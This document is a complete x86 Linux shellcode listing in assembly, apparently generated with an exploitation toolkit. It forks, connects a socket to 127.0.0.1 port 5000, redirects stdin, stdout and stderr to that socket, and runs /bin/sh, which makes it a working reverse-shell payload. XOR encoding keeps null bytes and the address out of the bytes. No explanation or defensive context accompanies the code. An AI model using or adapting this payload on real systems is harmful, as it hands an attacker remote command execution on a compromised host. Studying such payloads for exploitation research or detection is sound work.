    push eax
    /* fork() */
    /* setregs noop */
    /* call fork() */
    push SYS_fork /* 2 */
    pop eax
    int 0x80
    mov edx, eax
    xor eax, eax
    cmp edx, 0
    lahf
    and ah, 0x40
    shr eax, 14
    xor eax, 0x1
    mov ecx, eax
    pop edx
    imul ecx, 125
    add edx, ecx
    add edx, 36
    jmp edx
/* open new socket, save it */
    /* open new socket */
    /* socketcall(AF_INET (2), SOCK_STREAM (1), 0) */
    /* push 0 */
    push 1
    dec byte ptr [esp] /* socklen_t addrlen */
    /* push SOCK_STREAM (1) */
    push 1     /* sockaddr *addr */
    /* push AF_INET (2) */
    push 2       /* sockfd */
    /* call socketcall(SYS_socketcall_socket (1), 'esp') */
    push SYS_socketcall /* 0x66 */
    pop eax
    push SYS_socketcall_socket /* 1 */
    pop ebx
    mov ecx, esp
    int 0x80
    mov edx, eax

/* push sockaddr, connect() */
    /* push b'\x02\x00\x13\x88\x7f\x00\x00\x01' */
    push 0x2010101
    xor dword ptr [esp], 0x301017e
    push 0x1010101
    xor dword ptr [esp], 0x89120103
    mov ecx, esp
    /* socketcall('edx', 'ecx', 0x10) */
    /* push 0x10 */
    push 0x10 /* socklen_t addrlen */
    push ecx     /* sockaddr *addr */
    push edx       /* sockfd */
    /* call socketcall(SYS_socketcall_connect (3), 'esp') */
    push SYS_socketcall /* 0x66 */
    pop eax
    push SYS_socketcall_connect /* 3 */
    pop ebx
    mov ecx, esp
    int 0x80

/* Socket that is maybe connected is in edx */
    /* dup() file descriptor edx into stdin/stdout/stderr */
dup_1:
    mov ebx, edx
    push 3
    pop ecx
loop_2:
    dec ecx

    /* dup2(fd='ebx', fd2='ecx') */
    /* setregs noop */
    /* call dup2() */
    push SYS_dup2 /* 0x3f */
    pop eax
    int 0x80
    jnz loop_2

    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80
    /* exit(status=0) */
    xor ebx, ebx
    /* call exit() */
    push SYS_exit /* 1 */
    pop eax
    int 0x80
    ret
 
